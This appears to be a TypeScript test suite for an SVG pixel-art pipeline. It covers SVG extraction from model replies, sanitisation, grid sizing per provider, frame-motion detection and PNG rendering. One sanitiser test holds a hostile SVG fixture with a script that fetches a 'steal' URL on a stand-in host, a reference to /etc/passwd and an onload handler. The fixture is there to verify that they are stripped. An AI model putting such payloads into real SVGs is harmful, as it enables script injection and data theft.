import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import sharp from "sharp";
import { describe, expect, it } from "vitest";
import { buildPixelPrompt, distinctFrames, frameMotion, MIN_FRAME_GRID, extractSvg, gridForProvider, MIN_GRID, smallerGrid, PIXEL_GRID, pixelGrid, prepareSvg, renderPixelSvg, sanitizeSvg, SHEET_FRAME_GRID, sheetGridForProvider } from "../svg-pixel.js";

const drawing = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 4 4" width="4" height="4"><rect x="0" y="0" width="2" height="2" fill="#e0a"/><rect x="2" y="2" width="2" height="2" fill="#0ae"/></svg>';

describe("extractSvg", () => {
  it("takes the SVG out of a fenced, chatty reply", () => {
    expect(extractSvg(`Sure!\n\`\`\`svg\n${drawing}\n\`\`\`\nHope that helps.`)).toBe(drawing);
  });

  it("refuses a reply with no SVG", () => {
    expect(() => extractSvg("I can't draw that.")).toThrow(/without an SVG/);
  });
});

describe("sanitizeSvg", () => {
  it("drops scripts, remote references and event handlers", () => {
    const hostile = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 4 4">
      <script>fetch("https://example.test/steal")</script>
      <image href="https://example.test/pixel.png" width="4" height="4"/>
      <use xlink:href="/etc/passwd"/>
      <use href="https://example.test/sprite.svg#part"/>
      <rect x="0" y="0" width="1" height="1" fill="#fff" onload="alert(1)" style="filter:url(#x)"/>
      <rect x="1" y="0" width="1" height="1" fill="url(https://example.test/p)"/>
    </svg>`;
    const clean = sanitizeSvg(hostile);
    expect(clean).not.toMatch(/script|onload|href|style=|<image|url\(/i);
    expect(clean).toMatch(/<rect x="0" y="0" width="1" height="1" fill="#fff"\s*\/>/);
  });

  it("keeps reuse inside the document, and only transforms that keep pixels square", () => {
    const reuse = `<svg viewBox="0 0 8 4"><defs><g id="leg-up"><rect width="1" height="2" fill="#123"/></g></defs>
      <use href="#leg-up" x="2" y="1"/>
      <use xlink:href='#leg-up' transform="translate(4, 0) scale(-1, 1)"/>
      <use href="#leg-up" transform="rotate(15)"/>
      <use href="#leg-up" transform="scale(2)"/></svg>`;
    const clean = sanitizeSvg(reuse);
    expect(clean).toContain('<defs><g id="leg-up">');
    expect(clean).toContain('<use href="#leg-up" x="2" y="1"/>');
    expect(clean).toContain(`xlink:href='#leg-up' transform="translate(4, 0) scale(-1, 1)"`);
    expect(clean).not.toMatch(/rotate|scale\(2\)/);
  });
});

describe("pixelGrid", () => {
  it("matches the requested canvas aspect, so a wide asset isn't drawn square", () => {
    expect(pixelGrid(1024, 1024)).toEqual({ width: PIXEL_GRID, height: PIXEL_GRID });
    expect(pixelGrid(2048, 1024)).toEqual({ width: 2 * PIXEL_GRID, height: PIXEL_GRID });
  });

  it("gives a provider with more output room a finer grid", () => {
    // Measured: gemini-3.8-flash-high draws 64 cleanly and truncates mid-tag at 96.
    expect(gridForProvider("anthropic")).toBe(96);
    expect(gridForProvider("antigravity")).toBe(PIXEL_GRID);
    expect(pixelGrid(1024, 1024, null, gridForProvider("anthropic"))).toEqual({ width: 96, height: 96 });
  });

  it("steps the grid down after a truncated drawing, and stops at a readable floor", () => {
    // gemini truncated at 96 and sometimes at 64, so the ceiling is walked down, not guessed once.
    expect(smallerGrid(96)).toBe(72);
    expect(smallerGrid(72)).toBe(56);
    expect(smallerGrid(64)).toBe(48);
    // Below the floor a sprite stops reading as the subject, so the back-off ends there.
    expect(smallerGrid(36)).toBe(MIN_GRID);
    expect(smallerGrid(MIN_GRID)).toBe(MIN_GRID);
  });

  it("gives a sprite sheet an exact multiple of its frame grid", () => {
    // The 4x3 sheet that was drawn as one square tile before frames had cell boundaries.
    expect(pixelGrid(2048, 1536, { columns: 4, rows: 3 })).toEqual({ width: 4 * SHEET_FRAME_GRID, height: 3 * SHEET_FRAME_GRID });
  });
});

describe("buildPixelPrompt", () => {
  it("overrides the canvas the request asks for, and says so", () => {
    const prompt = buildPixelPrompt("Deliver 12 frames on a 2048x1536 canvas", { width: 2048, height: 1536, layout: { columns: 4, rows: 3 } });
    expect(prompt).toMatch(/Canvas is exactly 96x72 cells/);
    expect(prompt).toMatch(/override any canvas, size, resolution or format the request above asks for/);
    expect(prompt).toMatch(/4 columns x 3 rows of 24x24 frames/);
  });

  it("carries the source drawing in when redrawing a referenced asset", () => {
    expect(buildPixelPrompt("Animate it", { width: 1024, height: 1024, sourceSvg: "<svg><rect/></svg>" })).toMatch(/exact subject to redraw[\s\S]*<svg><rect\/><\/svg>/);
  });
});

describe("prepareSvg", () => {
  it("keeps the model's own viewBox size", () => {
    expect(prepareSvg(drawing)).toMatchObject({ width: 4, height: 4 });
  });

  it("falls back to the asked-for grid when the viewBox is missing", () => {
    expect(prepareSvg('<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1" fill="#fff"/></svg>', { width: 64, height: 48 })).toMatchObject({ width: 64, height: 48 });
  });

  it("refuses an SVG left with nothing to draw", () => {
    expect(() => prepareSvg('<svg viewBox="0 0 4 4"><script>x</script></svg>')).toThrow(/nothing to draw/);
  });
});

describe("distinctFrames", () => {
  it("counts repeated poses, the way a stuttering walk cycle shows up", async () => {
    const dir = await mkdtemp(join(tmpdir(), "svg-sheet-"));
    try {
      // A 4x3 sheet alternating two drawings — what a model does when the frames are too small to
      // tell poses apart: it looks like twelve frames and animates as two.
      const [W, H] = [4 * 8, 3 * 8];
      const data = Buffer.alloc(W * H * 4);
      for (let r = 0; r < 3; r++) for (let c = 0; c < 4; c++) {
        const shade = (r * 4 + c) % 2 ? 200 : 100;
        for (let y = 0; y < 8; y++) for (let x = 0; x < 8; x++) {
          const i = ((r * 8 + y) * W + c * 8 + x) * 4;
          data[i] = shade; data[i + 1] = shade; data[i + 2] = shade; data[i + 3] = 255;
        }
      }
      const sheet = join(dir, "sheet.png");
      await sharp(data, { raw: { width: W, height: H, channels: 4 } }).png().toFile(sheet);
      expect(await distinctFrames(sheet, { columns: 4, rows: 3 })).toBe(2);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  it("gives a provider with more room a finer frame", () => {
    expect(sheetGridForProvider("claude-cli")).toBe(48);
    expect(sheetGridForProvider("antigravity")).toBe(SHEET_FRAME_GRID);
  });

  it("backs a sheet off to a floor above the size where poses collapse", () => {
    expect(smallerGrid(32, MIN_FRAME_GRID)).toBe(24);
    expect(smallerGrid(24, MIN_FRAME_GRID)).toBe(MIN_FRAME_GRID);
  });

  it("measures how far the drawing moves between frames, not just that frames differ", async () => {
    const dir = await mkdtemp(join(tmpdir(), "svg-motion-"));
    try {
      const size = 20;
      const sheetOf = async (name: string, paint: (index: number, x: number, y: number) => boolean) => {
        const [W, H] = [4 * size, 4 * size];
        const data = Buffer.alloc(W * H * 4);
        for (let index = 0; index < 16; index++)
          for (let y = 0; y < size; y++)
            for (let x = 0; x < size; x++) {
              if (!paint(index, x, y)) continue;
              const i = ((Math.floor(index / 4) * size + y) * W + (index % 4) * size + x) * 4;
              data[i] = 255; data[i + 3] = 255;
            }
        const path = join(dir, name);
        await sharp(data, { raw: { width: W, height: H, channels: 4 } }).png().toFile(path);
        return path;
      };
      const layout = { columns: 4, rows: 4 };
      // The same 4x4 block, drifting a pixel right each frame: every frame is technically
      // different, but nothing moves — this is what fooled a plain pixel diff.
      const drifting = await sheetOf("drift.png", (index, x, y) => y >= 10 && y < 14 && x >= index && x < index + 4);
      expect(await distinctFrames(drifting, layout)).toBe(16);
      expect(await frameMotion(drifting, layout)).toMatchObject({ motion: 0, empty: 0 });
      // A block that changes shape — a pose change — reads as motion.
      const posing = await sheetOf("pose.png", (index, x, y) => y >= 10 && y < 14 && x >= 8 && x < (index % 2 ? 16 : 10));
      expect((await frameMotion(posing, layout)).motion).toBeGreaterThan(2);
      // Half the sheet left blank is caught outright.
      const half = await sheetOf("half.png", (index, x, y) => index < 8 && y >= 10 && y < 14 && x >= 8 && x < (index % 2 ? 16 : 10));
      expect((await frameMotion(half, layout)).empty).toBe(8);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe("renderPixelSvg", () => {
  it("rasterises to a transparent PNG at the requested size, with hard cell edges", async () => {
    const dir = await mkdtemp(join(tmpdir(), "svg-pixel-"));
    try {
      const output = join(dir, "out.png");
      const { svg, width, height } = prepareSvg(drawing);
      expect([width, height]).toEqual([4, 4]);
      await renderPixelSvg(svg, output, 64, 64);
      const image = sharp(output);
      expect(await image.metadata()).toMatchObject({ width: 64, height: 64, hasAlpha: true });
      // The drawing fills only two opposite quarters; nearest upscale must keep the rest empty.
      const { data } = await image.ensureAlpha().raw().toBuffer({ resolveWithObject: true });
      const alphaAt = (x: number, y: number) => data[(y * 64 + x) * 4 + 3];
      expect(alphaAt(48, 8)).toBe(0);
      expect(alphaAt(8, 8)).toBe(255);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});
